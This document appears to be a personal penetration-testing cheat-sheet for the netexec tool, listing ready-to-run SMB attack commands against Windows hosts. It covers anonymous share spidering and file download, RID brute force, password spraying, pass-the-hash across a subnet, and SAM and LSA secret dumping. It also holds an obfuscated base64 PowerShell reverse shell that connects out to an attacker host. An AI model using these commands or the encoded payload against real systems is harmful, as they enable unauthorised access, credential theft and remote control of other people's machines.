---
tags:
  - smb
  - ldap
---
# netexec

Enumerate services

## Capabilities

### SMB

```bash
# Null authentication
nxc smb $IP -u '' -p ''

# Anonymous authentication
nxc smb $IP -u 'a' -p ''

# Enumerate shares
nxc smb $IP -u 'a' -p '' --shares

# Spider all shares, downloading all readable files
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
# List all files with their respective shares
cat 10.129.34.120.json | jq '. | map_values(keys)'

# Brute force usernames through RIDs
nxc smb $IP -u 'a' -p '' --rid-brute 10000

# Brute force discovered users
nxc smb 10.129.207.146 -u users.txt -p users.txt --continue-on-success

# Password spray
nxc smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### Credentialed commands

```bash
# Check credentials (default to smb)
nxc smb 10.129.34.120 -u Administrator -p 'Ticketmaster1968'

# Execute commands (default to wmi, then smb)
nxc wmi 10.129.34.120 -u Administrator -p 'Ticketmaster1968' -x whoami
nxc smb 10.129.34.120 -u Administrator -p 'Ticketmaster1968' -x whoami
nxc smb 10.129.34.120 -u Administrator -p 'Ticketmaster1968' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQA2ADMAJwAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA='
```

NOTE: Add `--local-auth` flag to check credentials against the local user database, as opposed to the domain

Check a NetNTLMv2 hash with the following commands

Example hash:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
```

```bash
nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
```

Applied to our example:

```bash
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

#### Obtaining credentials

```bash
# Dump SAM (requires Domain Admin or Local Admin Privileges with --local-auth)
nxc smb 10.129.34.120 -u Administrator -p 'Ticketmaster1968' --sam

# Dump LSA secrets (requires Domain Admin or Local Admin Privileges with --local-auth)
nxc smb 10.129.34.120 -u Administrator -p 'Ticketmaster1968' --lsa
```
